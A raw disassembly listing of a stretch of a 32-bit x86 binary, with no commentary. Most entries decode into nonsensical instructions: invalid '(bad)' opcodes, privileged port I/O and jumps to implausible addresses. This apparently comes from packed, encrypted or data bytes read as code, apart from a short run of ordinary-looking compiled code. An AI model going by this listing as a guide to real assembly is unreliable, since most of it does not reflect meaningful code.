  409c4f:	dec    eax
  409c50:	push   edx
  409c51:	mov    dl,0x2c
  409c53:	repnz sti 
  409c55:	mov    ah,0x2
  409c57:	sub    DWORD PTR [esi],edx
  409c59:	push   ss
  409c5a:	cmp    eax,0x61161604
  409c5f:	les    esi,FWORD PTR [edx-0x1b]
  409c62:	sub    eax,0xa585a3c4
  409c67:	inc    edx
  409c68:	add    BYTE PTR [esi+0x68c4226a],bh
  409c6e:	pushf  
  409c6f:	jg     0x409c89
  409c71:	mov    ch,0x6e
  409c73:	push   esp
  409c74:	mov    WORD PTR [bp+di+0x40fc],ds
  409c79:	lahf   
  409c7a:	xchg   ebp,eax
  409c7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c7c:	push   ss
  409c7d:	std    
  409c7e:	xchg   edi,eax
  409c7f:	(bad)  
  409c80:	out    0xa6,eax
  409c82:	xlat   BYTE PTR ds:[ebx]
  409c83:	pop    edx
  409c84:	xchg   DWORD PTR [edi-0xe92cdf2],esi
  409c8a:	dec    esi
  409c8b:	and    al,0xa4
  409c8d:	xchg   edx,eax
  409c8e:	nop
  409c8f:	ins    DWORD PTR es:[edi],dx
  409c90:	inc    edi
  409c91:	sbb    bh,dl
  409c93:	outs   dx,DWORD PTR ds:[esi]
  409c94:	fnstsw WORD PTR [edx]
  409c96:	adc    al,0x14
  409c98:	clc    
  409c99:	pop    edi
  409c9a:	cs std 
  409c9c:	xchg   ebx,eax
  409c9d:	iret   
  409c9e:	dec    ecx
  409c9f:	cmp    bh,BYTE PTR [edi+0x3e]
  409ca2:	lahf   
  409ca3:	aam    0xca
  409ca5:	mov    ds,esi
  409ca7:	retf   
  409ca8:	pop    edi
  409ca9:	mov    ecx,0x2f53b17f
  409cae:	fwait
  409caf:	adc    BYTE PTR [edx-0x38d69b90],dl
  409cb5:	cmp    BYTE PTR cs:[ebx],0x6a
  409cb9:	mov    bh,0x7c
  409cbb:	inc    ebp
  409cbc:	push   0xffffffb5
  409cbe:	outs   dx,DWORD PTR ds:[esi]
  409cbf:	mov    ds:0xfd2eeb39,eax
  409cc4:	jp     0x409ce8
  409cc6:	shl    dl,1
  409cc8:	xor    DWORD PTR [ecx-0x12],ebp
  409ccb:	mov    ds:0x88b8c6ed,al
  409cd0:	vpminsw xmm0,xmm7,xmm6
  409cd4:	inc    ebx
  409cd5:	xchg   BYTE PTR [ebp+0x3b2e215d],dl
  409cdb:	jmp    0x477006a1
  409ce0:	cmp    ecx,DWORD PTR [ebp-0x59d80540]
  409ce6:	inc    edx
  409ce7:	scas   eax,DWORD PTR es:[edi]
  409ce8:	test   eax,0x630362a8
  409ced:	loope  0x409d20
  409cef:	ss je  0x409d39
  409cf2:	stc    
  409cf3:	xchg   BYTE PTR [eax+0x59],cl
  409cf6:	je     0x409cf1
  409cf8:	clc    
  409cf9:	fidivr DWORD PTR [ebx]
  409cfb:	xor    BYTE PTR [ebp+0x2be677d6],0x6a
  409d02:	jle    0x409cba
  409d04:	ret    0xd87b
  409d07:	add    DWORD PTR [ecx-0x1594ec29],0x6
  409d0e:	test   al,0xe0
  409d10:	xor    ebx,DWORD PTR [ebp-0x39]
  409d13:	push   ecx
  409d14:	pop    ss
  409d15:	das    
  409d16:	mov    esi,0x4ea72321
  409d1b:	inc    ebx
  409d1c:	or     eax,0x325f0053
  409d21:	push   ebp
  409d22:	repz stc 
  409d24:	and    DWORD PTR [edi-0xf7e5d82],esi
  409d2a:	mov    BYTE PTR cs:[esi],ch
  409d2d:	sub    al,0x2a
  409d2f:	in     eax,dx
  409d30:	adc    eax,0xeffc7204
  409d35:	xchg   edi,eax
  409d36:	imul   edx,DWORD PTR [ebx],0x68b628db
  409d3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d3d:	xlat   BYTE PTR ds:[ebx]
  409d3e:	jnp    0x409dac
  409d40:	pop    ebp
  409d41:	sbb    edx,DWORD PTR [edi+0xc127326]
  409d47:	push   esp
  409d48:	fsubr  QWORD PTR [eax+0x5c]
  409d4b:	and    eax,0x4f4d4161
  409d50:	add    ebx,eax
  409d52:	mov    ebx,0x81914c75
  409d57:	mov    bl,0xe4
  409d59:	xchg   DWORD PTR [edi],esp
  409d5b:	sbb    edi,ebx
  409d5d:	sub    ecx,DWORD PTR [edx+0x18]
  409d60:	lock xchg edi,eax
  409d62:	push   es
  409d63:	xchg   edi,eax
  409d64:	mov    al,0xe5
  409d66:	test   BYTE PTR [edx],al
  409d68:	inc    eax
  409d69:	or     BYTE PTR [esi+eiz*1],dl
  409d6c:	stc    
  409d6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d6e:	sub    ebx,DWORD PTR [edx]
  409d70:	sahf   
  409d71:	fnstsw WORD PTR ds:0x637c4c9
  409d77:	sub    ecx,DWORD PTR [ecx-0xe9e2a17]
  409d7d:	jl     0x409dd7
  409d7f:	mov    al,ds:0xca5a55cf
  409d84:	jno    0x409d2c
  409d86:	fst    DWORD PTR [edx-0x37ac457b]
  409d8c:	les    edi,FWORD PTR [ebp-0x5178b406]
  409d92:	iret   
  409d93:	or     ah,cl
  409d95:	aam    0xb5
  409d97:	jg     0x409dcc
  409d99:	sub    al,0x2d
  409d9b:	loopne 0x409db4
  409d9d:	and    BYTE PTR [eax-0x1c],dl
  409da0:	xor    DWORD PTR [esi+0x1e],ecx
  409da3:	(bad)  
  409da4:	xchg   edi,eax
  409da5:	jnp    0x409df4
  409da7:	hlt    
  409da8:	inc    esi
  409da9:	int    0x22
  409dab:	pop    ecx
  409dac:	jo     0x409e2c
  409dae:	xchg   ecx,eax
  409daf:	dec    esi
  409db0:	push   esp
  409db1:	sub    BYTE PTR [esp+ebp*1-0x59],cl
  409db5:	push   es
  409db6:	fwait
  409db7:	jmp    FWORD PTR [esi-0x13]
  409dba:	pop    ebp
  409dbb:	dec    ebp
  409dbc:	or     BYTE PTR cs:0x5e38921,ah
  409dc3:	ins    BYTE PTR es:[edi],dx
  409dc4:	mov    BYTE PTR [edi-0x6436371b],dh
  409dca:	cmp    eax,0x6bed081d
  409dcf:	push   ebx
  409dd0:	mov    al,ds:0x8a94779
  409dd5:	dec    ebx
  409dd6:	prefetchnta BYTE PTR [edx]
  409dd9:	clc    
  409dda:	mov    dl,0x9d
  409ddc:	inc    ebp
  409ddd:	fidiv  WORD PTR [edx+0x496e05b1]
  409de3:	add    al,0x1e
  409de5:	stc    
  409de6:	inc    ecx
  409de7:	mov    al,ds:0x7d39d372
  409dec:	ficomp WORD PTR [edi]
  409dee:	inc    ecx
  409def:	ds loope 0x409dbd
  409df2:	loope  0x409e04
  409df4:	in     eax,dx
  409df5:	repz test eax,0xbcf2ec05
  409dfb:	sahf   
  409dfc:	pop    ss
  409dfd:	out    dx,eax
  409dfe:	or     bl,BYTE PTR [esi-0x11]
  409e01:	dec    ebp
  409e02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e03:	adc    DWORD PTR [ecx+0x7],edx
  409e06:	icebp  
  409e07:	hlt    
  409e08:	imul   ecx,DWORD PTR [edi-0x4e09bc2],0x7b4f0274
  409e12:	bnd jp 0x409dfc
  409e15:	jne    0x409e63
  409e17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e18:	sub    edi,eax
  409e1a:	mov    bl,0x6a
  409e1c:	mov    eax,0x6abc57cb
  409e21:	xchg   DWORD PTR [esi-0x73],esi
  409e24:	mov    ds:0xcb420b5f,al
  409e29:	add    eax,0x73120904
  409e2e:	push   0x7
  409e30:	les    edi,FWORD PTR [edi+0x4d01a520]
  409e36:	sti    
  409e37:	cmp    ah,BYTE PTR [esi+0x6f]
  409e3a:	jbe    0x409e2f
  409e3c:	push   es
  409e3d:	push   edx
  409e3e:	mov    bh,0x8e
  409e40:	xchg   edi,eax
  409e41:	mov    cl,0x82
  409e43:	lahf   
  409e44:	adc    BYTE PTR [ecx+0x71],al
  409e47:	in     al,0xf0
  409e49:	inc    ecx
  409e4a:	test   DWORD PTR [esi-0x13277fff],edi
  409e50:	adc    al,BYTE PTR ds:0xc83dfe34
  409e56:	js     0x409ea1
  409e58:	leave  
  409e59:	add    eax,0xe32732fb
  409e5e:	sbb    BYTE PTR [esi+0x1f],ah
  409e61:	test   al,0xa7
  409e63:	mov    eax,0x351dad7f
  409e68:	jg     0x409e2a
  409e6a:	out    dx,al
  409e6b:	cmp    al,0xb0
  409e6d:	inc    edx
  409e6e:	aam    0xbf
  409e70:	push   ecx
  409e71:	ins    DWORD PTR es:[edi],dx
  409e72:	mov    ch,0x8c
  409e74:	push   es
  409e75:	je     0x409e24
  409e77:	sub    bl,bh
  409e79:	inc    ecx
  409e7a:	mov    ebp,DWORD PTR [ebx+eax*2+0x7b]
  409e7e:	fldcw  WORD PTR [edx]
  409e80:	lahf   
  409e81:	fcmovu st,st(6)
  409e83:	scas   al,BYTE PTR es:[edi]
  409e84:	mov    edi,0x13f8c6aa
  409e89:	add    eax,DWORD PTR [ecx+0x21a76dc0]
  409e8f:	out    0x58,eax
  409e91:	or     esi,DWORD PTR [edi-0x63]
  409e94:	pop    esi
  409e95:	daa    
  409e96:	call   edi
  409e98:	jb     0x409e6e
  409e9a:	shl    DWORD PTR [ebx+0x2683873b],1
  409ea0:	inc    edx
  409ea1:	cmc    
  409ea2:	retf   0x7221
  409ea5:	fcomi  st,st(4)
  409ea7:	inc    ecx
  409ea8:	sbb    al,0xa5
  409eaa:	loope  0x409e3b
  409eac:	xor    al,0xa5
  409eae:	inc    ebx
  409eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409eb0:	xor    ah,BYTE PTR [ecx]
  409eb2:	outs   dx,BYTE PTR ds:[esi]
  409eb3:	ret    0x5264
  409eb6:	inc    edi
  409eb7:	xor    ebx,DWORD PTR [ebx-0x1b41c8dc]
  409ebd:	stos   BYTE PTR es:[edi],al
  409ebe:	jne    0x409ee1
  409ec0:	adc    ah,bh
  409ec2:	dec    esi
  409ec3:	bound  esi,QWORD PTR [esi-0x16]
  409ec6:	enter  0x649d,0xbe
  409eca:	cmc    
  409ecb:	cdq    
  409ecc:	push   ss
  409ecd:	cs cli 
  409ecf:	shl    DWORD PTR [ebp+edx*2+0x6f],1
  409ed3:	sub    al,bl
  409ed5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ed6:	pop    ss
  409ed7:	inc    ebx
  409ed8:	sub    DWORD PTR [ebp-0x2eac5fe5],ebx
  409ede:	call   0x4c2971e4
  409ee3:	out    dx,eax
  409ee4:	fadd   st,st(0)
  409ee6:	in     eax,0x3f
  409ee8:	es jne 0x409f45
  409eeb:	and    ebp,DWORD PTR [ebx+0x39a30092]
  409ef1:	and    eax,0x451e3299
  409ef6:	dec    eax
  409ef7:	imul   ebx,DWORD PTR [eax],0x2
  409efa:	enter  0xaedc,0xc
  409efe:	outs   dx,DWORD PTR ds:[esi]
  409eff:	inc    ebx
  409f00:	or     BYTE PTR [ebx+eax*4],ch
  409f03:	inc    eax
  409f04:	sbb    edi,0x20
  409f07:	dec    esi
  409f08:	aad    0x21
  409f0a:	(bad)  
  409f0b:	repz mov ah,0xa5
  409f0e:	cs adc esp,DWORD PTR gs:[bx+si+0x60]
  409f14:	(bad)  
  409f15:	push   cx
  409f17:	xchg   ecx,eax
  409f18:	or     al,0x51
  409f1a:	or     ecx,DWORD PTR [edx+0x2b]
  409f1d:	test   eax,0xa8c2e9a1
  409f22:	inc    BYTE PTR [eax-0x58]
  409f25:	das    
  409f26:	inc    ebx
  409f27:	inc    esi
  409f28:	iret   
  409f29:	inc    esi
  409f2a:	and    BYTE PTR [edx],0xfc
  409f2d:	jg     0x409f54
  409f2f:	add    BYTE PTR [esp+0x6f],al
  409f33:	hlt    
  409f34:	pop    edi
  409f35:	mov    dh,0xc9
  409f37:	rol    DWORD PTR [eax],cl
  409f39:	loop   0x409fa9
  409f3b:	cmp    ebx,DWORD PTR [eax-0x60]
  409f3e:	(bad)  
  409f40:	push   ss
  409f41:	or     al,0x23
  409f43:	add    ecx,eax
  409f45:	int    0x1
  409f47:	and    BYTE PTR [edx-0x7c50376],bl
  409f4d:	jmp    0x3f0aa810
  409f52:	in     eax,dx
  409f53:	adc    DWORD PTR [eax+0x3d407336],edx
  409f59:	lea    esp,[edi-0x7f]
  409f5c:	jle    0x409f2d
  409f5e:	adc    bh,BYTE PTR [edx-0x7c0dbbbe]
  409f64:	sbb    eax,0xc9e86c12
  409f69:	adc    esp,edi
  409f6b:	js     0x409f90
  409f6d:	mov    al,0xd4
  409f6f:	lock loop 0x409f03
  409f72:	mov    ebx,0x58e22ef6
  409f77:	pop    edx
  409f78:	popa   
  409f79:	test   eax,0x8fb686c9
  409f7e:	xor    ah,0xb8
  409f81:	pop    es
  409f82:	cld    
  409f83:	inc    ebx
  409f84:	sbb    al,0xa4
  409f86:	ds and eax,0x78bd8e55
  409f8c:	jl     0x409fb8
  409f8e:	popf   
  409f8f:	add    al,0xaa
  409f91:	sub    al,0x16
  409f93:	sbb    al,0x4e
  409f95:	es loop 0x409ffa
  409f98:	mov    al,ds:0x3dbc2f51
  409f9d:	pop    ss
  409f9e:	xchg   ebx,eax
  409f9f:	shl    BYTE PTR [eax],0xe9
  409fa2:	retf   0x2ded
  409fa5:	out    0xa1,al
  409fa7:	out    0xa,al
  409fa9:	push   esi
  409faa:	adc    al,0x26
  409fac:	clc    
  409fad:	push   eax
  409fae:	pusha  
  409faf:	(bad)  
  409fb0:	cmp    al,0x3c
  409fb2:	test   DWORD PTR [ebx+0x3d252bfc],ebx
  409fb8:	(bad)
  409fbc:	pop    ds
  409fbd:	pop    ebp
  409fbe:	test   DWORD PTR [ecx],0xa1433c4f
  409fc4:	push   eax
  409fc5:	inc    ebp
  409fc6:	in     eax,dx
  409fc7:	(bad)  
  409fc8:	fidiv  DWORD PTR ds:0x26309f98
  409fce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fcf:	pop    ebp
  409fd0:	and    DWORD PTR [ecx-0x1e4bab5],esi
  409fd6:	fstp   DWORD PTR [edi]
  409fd8:	retf   0x778f
  409fdb:	jbe    0x40a038
  409fdd:	test   DWORD PTR [esi+0x72c1f81b],esp
  409fe3:	neg    DWORD PTR [edi]
  409fe5:	mov    al,ds:0x26ea92d1
  409fea:	mov    dh,0xf1
  409fec:	repz bound ebx,QWORD PTR [ebp+0x18eee37b]
  409ff3:	es into 
  409ff5:	pop    eax
  409ff6:	int3   
  409ff7:	iret   
  409ff8:	push   ebp
  409ff9:	rol    DWORD PTR [eax+0x62],cl
  409ffc:	(bad)  
  409ffe:	push   esi
  409fff:	shr    BYTE PTR ds:0xf67f73a7,1
  40a005:	out    dx,al
  40a006:	jge    0x409f89
  40a008:	test   DWORD PTR [ebx],0x7fd09c5f
  40a00e:	mov    ds:0xc6ae3b2b,al
  40a013:	mov    al,0x46
  40a015:	pop    edi
  40a016:	icebp  
  40a017:	arpl   WORD PTR [edi-0x48712c18],cx
  40a01d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a01e:	dec    edx
  40a01f:	sub    DWORD PTR [ecx+eiz*4-0x578a94b6],esp
  40a026:	mov    dh,0xe5
  40a028:	in     al,dx
  40a029:	jp     0x40a004
  40a02b:	jno    0x40a04f
  40a02d:	adc    ebp,eax
  40a02f:	push   ecx
  40a030:	fcomp  DWORD PTR [ebp+0x30]
  40a033:	scas   eax,DWORD PTR es:[edi]
  40a034:	jne    0x40a043
  40a036:	mov    al,0x64
  40a038:	sbb    DWORD PTR [esi+0x2c],esp
  40a03b:	(bad)  
  40a03c:	push   0xfffffff5
  40a03e:	jno    0x409fef
  40a040:	pusha  
  40a041:	or     al,0x65
  40a043:	push   0x4472522e
  40a048:	out    dx,al
  40a049:	mov    ds:0xb847de73,al
  40a04e:	in     eax,dx
  40a04f:	mov    ?,ebp
  40a051:	test   DWORD PTR [ebp-0x71],edi
  40a054:	je     0x40a022
  40a056:	mov    al,ds:0xe589588e
  40a05b:	shl    dh,0x12
  40a05e:	xor    al,0xa9
  40a060:	dec    edi
  40a061:	push   esi
  40a062:	push   ecx
  40a063:	sbb    al,ah
  40a065:	and    BYTE PTR [ebx+0x18],0xaf
  40a069:	jge    0x40a085
  40a06b:	int    0x9a
  40a06d:	rol    BYTE PTR [eax],1
  40a06f:	ss adc al,0xf8
  40a072:	jl     0x40a05d
  40a074:	inc    ecx
  40a075:	sub    BYTE PTR [eax+0x6f7310c4],ch
  40a07b:	sbb    DWORD PTR [ecx-0x25],edx
  40a07e:	fsubr  QWORD PTR [ebp+eax*1-0x7c]
  40a082:	push   ecx
  40a083:	movzx  edx,WORD PTR [edx-0x4]
  40a087:	dec    ecx
  40a088:	cmp    al,0xc0
  40a08a:	fs mov cl,0x76
  40a08d:	nop
  40a08e:	outs   dx,BYTE PTR ds:[esi]
  40a08f:	add    eax,0x1a062eae
  40a094:	add    BYTE PTR [edx+0x4e],bh
  40a097:	ds xchg ebx,eax
  40a099:	fwait
  40a09a:	cmp    DWORD PTR [eax],edi
  40a09c:	pop    esi
  40a09d:	mov    ?,WORD PTR [edx+edx*2]
  40a0a0:	pop    edi
  40a0a1:	shl    BYTE PTR [edx],0x97
  40a0a4:	pushf  
  40a0a5:	and    eax,0x42b3a43b
  40a0aa:	test   DWORD PTR [esi],eax
  40a0ac:	outs   dx,BYTE PTR ds:[esi]
  40a0ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0ae:	fidiv  WORD PTR [esi-0x6a371f9d]
  40a0b4:	test   DWORD PTR [edx-0x36105b6],edx
  40a0ba:	inc    esi
  40a0bb:	xor    al,0x12
  40a0bd:	and    BYTE PTR [edi],dh
  40a0bf:	inc    edi
  40a0c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0c1:	ret    0xb854
  40a0c4:	add    cl,ch
  40a0c6:	retf   0x8db0
  40a0c9:	imul   ebx,DWORD PTR [edx+0x3d914ef1],0x7c
  40a0d0:	mov    WORD PTR [ebx+0x1fd72e],fs
  40a0d6:	dec    esp
  40a0d7:	pop    ds
  40a0d8:	sbb    DWORD PTR [ecx+0x39],edx
  40a0db:	lods   al,BYTE PTR ds:[esi]
  40a0dc:	mov    ah,cl
  40a0de:	js     0x40a138
  40a0e0:	mov    ah,0xe8
  40a0e2:	pop    ecx
  40a0e3:	sbb    cl,al
  40a0e5:	arpl   bx,sp
  40a0e7:	cmp    eax,0x2e761c6e
  40a0ec:	popa   
  40a0ed:	mov    ebx,0x72bf9d08
  40a0f2:	lods   al,BYTE PTR ds:[esi]
  40a0f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0f4:	leave  
  40a0f5:	shl    DWORD PTR [edx-0x2a],1
  40a0f8:	add    BYTE PTR [edi-0x18],dh
  40a0fb:	and    al,0x8e
  40a0fd:	pop    ebp
  40a0fe:	cmp    cl,BYTE PTR [ebx+0x3f]
  40a101:	fcmovnu st,st(2)
  40a103:	or     al,ah
  40a105:	push   edx
  40a106:	loope  0x40a0b4
  40a108:	fcom   QWORD PTR [esi+0x6f37bf19]
  40a10e:	jb     0x40a180
  40a110:	xor    DWORD PTR [eax+0x6b],edi
  40a113:	test   DWORD PTR [eax-0x3a],esi
  40a116:	cmp    DWORD PTR [ecx+0x1b0b8928],esi
  40a11c:	inc    edx
  40a11d:	retf   0x5967
  40a120:	jmp    0x4d74:0x9068157
  40a127:	mov    DWORD PTR [edi+0x6d],0xc94f7d44
  40a12e:	(bad)  
  40a12f:	icebp  
  40a130:	cmp    ebp,0x4e3f5039
  40a136:	mov    esi,0x24867b2e
  40a13b:	inc    ecx
  40a13c:	data16 daa 
  40a13e:	add    DWORD PTR [edi],0x4d2946b8
  40a144:	popa   
  40a145:	adc    DWORD PTR fs:[edi],esi
  40a148:	sub    eax,0xb3771135
  40a14d:	lds    ebp,FWORD PTR [eax]
  40a14f:	es sub esp,ebx
  40a152:	es dec esp
  40a154:	rcl    DWORD PTR [ecx-0x4ad63bff],1
  40a15a:	out    0x38,eax
  40a15c:	sbb    BYTE PTR [ebx],ah
  40a15e:	icebp  
  40a15f:	retf   0xa3a1
  40a162:	xor    al,0x8f
  40a164:	add    DWORD PTR [ecx-0x660409fc],esi
  40a16a:	inc    esi
  40a16b:	xlat   BYTE PTR ds:[ebx]
  40a16c:	daa    
  40a16d:	sahf   
  40a16e:	jge    0x40a1c7
  40a170:	push   es
  40a171:	fadd   QWORD PTR [edi+edx*2+0x15]
  40a175:	jno    0x40a1ed
  40a177:	addr16 cmp al,0xad
  40a17a:	call   0xaa8ae573
  40a17f:	call   0xe441:0xf0ec9212
  40a186:	cmp    edx,ebp
  40a188:	cmp    eax,0xa3695e7
  40a18d:	bound  ecx,QWORD PTR [eax+0x39]
  40a190:	push   ecx
  40a191:	std    
  40a192:	sbb    ch,BYTE PTR [edx+0x4e]
  40a195:	loopne 0x40a1e0
  40a197:	mov    bl,0x68
  40a199:	push   esp
  40a19b:	fiadd  DWORD PTR [ebx-0x2a31e825]
  40a1a1:	push   ss
  40a1a2:	xor    eax,0xbbf405c7
  40a1a7:	jne    0x40a225
  40a1a9:	dec    eax
  40a1aa:	adc    ecx,DWORD PTR [bp+si]
  40a1ad:	loope  0x40a15d
  40a1af:	outs   dx,BYTE PTR ds:[esi]
  40a1b0:	push   edx
  40a1b1:	mov    ah,BYTE PTR [ebp+ebp*1+0x70]
  40a1b5:	add    al,0x1f
  40a1b7:	std    
  40a1b8:	pop    esi
  40a1b9:	out    0x7c,eax
  40a1bb:	hlt    
  40a1bc:	inc    edi
  40a1bd:	test   eax,0xa2587d1c
  40a1c2:	cmp    esi,DWORD PTR [ebx+0x1addeb06]
  40a1c8:	cmc    
  40a1c9:	imul   eax,DWORD PTR [ebx+ecx*1-0x3e],0xffffff8a
  40a1ce:	or     al,0x8
  40a1d0:	mov    eax,DWORD PTR [ebp-0x34]
  40a1d3:	or     BYTE PTR [eax],cl
  40a1d5:	mov    eax,DWORD PTR [ebp-0x10]
  40a1d8:	mov    ecx,DWORD PTR [ebp-0xc]
  40a1db:	shrd   eax,ecx,0x2
  40a1df:	shr    ecx,0x2
  40a1e2:	mov    ecx,DWORD PTR [ebp-0x10]
  40a1e5:	mov    edx,DWORD PTR [ebp-0xc]
  40a1e8:	xor    eax,edi
  40a1ea:	shl    ecx,0x1e
  40a1ed:	xor    edx,edx
  40a1ef:	or     eax,edx
  40a1f1:	lea    eax,[ebp+eax*1-0x4]
  40a1f5:	mov    DWORD PTR [ebp-0x34],eax
  40a1f8:	mov    eax,DWORD PTR [ebp-0x10]
  40a1fb:	mov    ecx,DWORD PTR [ebp-0xc]
  40a1fe:	shrd   eax,ecx,0x2
  40a202:	shr    ecx,0x2
  40a205:	jmp    0x40a78f
  40a20a:	sbb    eax,0xb41fb564
  40a20f:	push   ds
  40a210:	sbb    eax,0xfb6fa164
  40a215:	mov    ah,0x53
  40a217:	(bad)  
  40a218:	(bad)  
  40a219:	outs   dx,BYTE PTR ds:[esi]
  40a21a:	cmp    DWORD PTR [edi],ebx
  40a21c:	push   ss
  40a21d:	push   ss
  40a21e:	cmp    eax,0x42161604
  40a223:	add    BYTE PTR [edi+0x2c],cl
  40a226:	push   edi
  40a227:	sub    al,0xc4
  40a229:	aad    0x61
  40a22b:	xor    eax,0x78f362a2
  40a230:	das    
  40a231:	shl    DWORD PTR [ecx],cl
  40a233:	push   ds
  40a234:	xchg   ebp,ecx
  40a236:	lock or al,0x23
  40a239:	enter  0x11de,0x5a
  40a23d:	in     al,0x71
  40a23f:	push   ebx
  40a240:	in     eax,0x0
  40a242:	mov    DWORD PTR [edx+0x61],edi
  40a245:	fs in  eax,0x2
  40a248:	mov    DWORD PTR [esi],ebp
  40a24a:	mov    ecx,0xbbd89cea
  40a24f:	pusha  
  40a250:	shr    DWORD PTR [eax],1
  40a252:	rcl    BYTE PTR [edi],1
  40a254:	ins    DWORD PTR es:[edi],dx
  40a255:	xchg   BYTE PTR [ebx],ch
  40a257:	dec    ebx
  40a258:	fiadd  WORD PTR [ebp+0x28516cfa]
  40a25e:	xlat   BYTE PTR ds:[ebx]
  40a25f:	jle    0x40a25f
  40a261:	shl    DWORD PTR [esp+esi*4-0x20],cl
  40a265:	jno    0x40a2da
  40a267:	push   cs
  40a268:	cmc    
  40a269:	xor    ebx,edx
  40a26b:	xlat   BYTE PTR ds:[ebx]
  40a26c:	test   al,ch
  40a26e:	inc    esp
  40a26f:	fadd   QWORD PTR [eax+ebp*8-0x15]
  40a273:	fadd   DWORD PTR [edi]
  40a275:	add    BYTE PTR [eax-0x7b],0x92
  40a279:	pop    ebp
  40a27a:	pop    esi
  40a27b:	addr16 or ch,dh
  40a27e:	add    dh,dh
  40a280:	dec    BYTE PTR [edx-0x2371bf9e]
  40a286:	xchg   edx,eax
  40a287:	or     ch,dh
  40a289:	pop    esi
  40a28a:	js     0x40a228
  40a28c:	inc    edi
  40a28d:	test   BYTE PTR [ebx],bh
  40a28f:	shl    BYTE PTR ds:[edx-0xbfe0c55],cl
  40a296:	cli    
  40a297:	lea    esp,[edi-0xd]
  40a29a:	push   esi
  40a29b:	pop    ds
  40a29c:	cmp    eax,0x640147dc
  40a2a1:	inc    esi
  40a2a2:	arpl   WORD PTR [ebp-0x2d2de774],di
  40a2a8:	hlt    
  40a2a9:	or     BYTE PTR [ebp-0x4c55795c],bh
  40a2af:	cmp    edi,esp
  40a2b1:	jmp    0xd770:0xfa38d6a9
  40a2b8:	(bad)  [edi+0x2a]
  40a2bb:	stc    
  40a2bc:	stc    
  40a2bd:	push   cs
  40a2be:	push   0xfffffff8
  40a2c0:	jmp    0x40a253
  40a2c2:	pop    es
  40a2c3:	mov    DWORD PTR [esi],eax
  40a2c5:	mov    BYTE PTR [edi],dl
  40a2c7:	lods   al,BYTE PTR ds:[esi]
  40a2c8:	mov    esi,0xf2e44f86
  40a2cd:	bswap  edx
  40a2cf:	and    BYTE PTR [edi+0xe],ch
  40a2d2:	(bad)  
  40a2d4:	add    BYTE PTR [edi-0x80],0x9d
  40a2d8:	test   BYTE PTR [esi-0x45cbf6e6],dl
  40a2de:	pop    ebx
  40a2df:	mov    ebx,esp
  40a2e1:	fnsave [edx]
  40a2e3:	fistp  DWORD PTR [ebx+0x9]
  40a2e6:	fnstenv [esi+0x3d]
  40a2e9:	mov    bl,0x58
  40a2eb:	(bad)  
  40a2ec:	cmp    ah,BYTE PTR [edi+0x13c052a4]
  40a2f2:	retf   0x3717
  40a2f5:	ret    
  40a2f6:	sbb    al,0xcd
  40a2f8:	and    al,0x36
  40a2fa:	sahf   
  40a2fb:	lea    esp,[ebx+0x7e]
  40a2fe:	sar    ebp,cl
  40a300:	xchg   ebp,eax
  40a301:	ins    DWORD PTR es:[edi],dx
  40a302:	ins    DWORD PTR es:[edi],dx
  40a303:	inc    ebx
  40a304:	ret    
  40a305:	hlt    
  40a306:	fld    QWORD PTR fs:[esi+edx*8+0x38]
  40a30b:	xchg   ebx,eax
  40a30c:	cs es ret 
  40a30f:	push   0xc5240363
  40a314:	pusha  
  40a315:	outs   dx,DWORD PTR ds:[esi]
  40a316:	cmp    bh,bh
  40a318:	scas   eax,DWORD PTR es:[edi]
  40a319:	adc    edx,ecx
  40a31b:	push   edi
  40a31c:	addr16 push ds
  40a31e:	add    dh,al
  40a320:	scas   al,BYTE PTR es:[edi]
  40a321:	nop
  40a322:	push   ecx
  40a323:	and    al,0x81
  40a325:	mov    ?,WORD PTR [esi]
  40a327:	dec    esp
  40a328:	rol    BYTE PTR [esi+0x6f6898b4],cl
  40a32e:	jmp    0x5e8cb15d
  40a333:	or     ebx,DWORD PTR [ebx+0x42c8b028]
  40a339:	mov    edi,0x16a57917
  40a33e:	push   eax
  40a33f:	jbe    0x40a3a1
  40a341:	sbb    BYTE PTR [ecx+0x22],al
  40a344:	inc    eax
  40a345:	cmc    
  40a346:	pop    ecx
  40a347:	les    eax,FWORD PTR [eax]
  40a349:	shl    BYTE PTR [edx],0xe6
  40a34c:	inc    edi
  40a34d:	mov    esi,0x3a2a9fe5
  40a352:	push   ds
  40a353:	mov    ds:0xb3b8192a,al
  40a358:	push   eax
  40a359:	add    ebp,DWORD PTR [edi]
  40a35b:	lds    edi,FWORD PTR [edi-0x4b]
  40a35e:	push   es
  40a35f:	mov    ah,0x22
  40a361:	mov    dh,0x3b
  40a363:	pop    ebx
  40a364:	fst    DWORD PTR [esi-0x64007b17]
  40a36a:	fmul   DWORD PTR ss:[ebp-0x30ce3882]
  40a371:	add    al,0x8e
  40a373:	xchg   DWORD PTR [esi-0x7110aa4d],ebp
  40a379:	outs   dx,DWORD PTR ds:[esi]
  40a37a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a37b:	shr    DWORD PTR [edi],cl
  40a37d:	loop   0x40a3e4
  40a37f:	jmp    0x8114:0x4a03a786
  40a386:	add    eax,0x98cde8e6
  40a38b:	daa    
  40a38c:	dec    esi
  40a38d:	jg     0x40a38b
  40a38f:	out    dx,eax
  40a390:	push   ds
  40a391:	jns    0x40a329
  40a393:	push   edi
  40a394:	jo     0x40a3a0
  40a396:	adc    eax,0xb00e5ad7
  40a39b:	sahf   
  40a39c:	iret   
  40a39d:	mov    bl,0x62
  40a39f:	jo     0x40a3d4
  40a3a1:	je     0x40a39a
  40a3a3:	bound  eax,QWORD PTR [edx]
  40a3a5:	xchg   ebp,eax
  40a3a6:	pop    esi
  40a3a7:	sbb    al,0xd0
  40a3a9:	fst    QWORD PTR [edx]
  40a3ab:	sti    
  40a3ac:	add    edi,DWORD PTR [eax-0x3f5fa03c]
  40a3b2:	and    BYTE PTR [ebx-0x76396c0c],al
